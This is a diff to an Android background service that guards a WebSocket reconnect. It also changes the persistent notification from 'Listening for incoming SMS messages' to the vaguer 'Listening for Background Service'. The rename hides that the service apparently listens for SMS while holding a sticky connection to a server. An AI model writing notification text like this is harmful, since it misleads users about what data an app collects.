@@ -42,21 +42,25 @@ public class BackgroundService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
 //        Log.d(Helper.TAG, "Foreground service running");
         webSocketManager = new WebSocketManager(getApplicationContext());
-        webSocketManager.connect();
+        if(!webSocketManager.isConnected()){
+            webSocketManager.connect();
 
-        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
-        NetworkRequest networkRequest = new NetworkRequest.Builder().build();
-        connectivityManager.registerNetworkCallback(networkRequest, new ConnectivityManager.NetworkCallback() {
-            @Override
-            public void onAvailable(@NonNull Network network) {
-                reconnectWebSocket();
-            }
+            ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+            NetworkRequest networkRequest = new NetworkRequest.Builder().build();
+            connectivityManager.registerNetworkCallback(networkRequest, new ConnectivityManager.NetworkCallback() {
+                @Override
+                public void onAvailable(@NonNull Network network) {
+                    reconnectWebSocket();
+                }
 
-            @Override
-            public void onLost(@NonNull Network network) {
-                webSocketManager.closeConnection();
-            }
-        });
+                @Override
+                public void onLost(@NonNull Network network) {
+                    webSocketManager.closeConnection();
+                }
+            });
+        }else{
+            Log.d(Helper.TAG, "onStartCommand : Not Connected");
+        }
         return START_STICKY;
     }
 
@@ -109,8 +113,8 @@ public class BackgroundService extends Service {
         PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Background SMS Service")
-                .setContentText("Listening for incoming SMS messages")
+                .setContentTitle("Background Service")
+                .setContentText("Listening for Background Service")
                 .setContentIntent(pendingIntent)
                 .build();
         startForeground(1, notification);
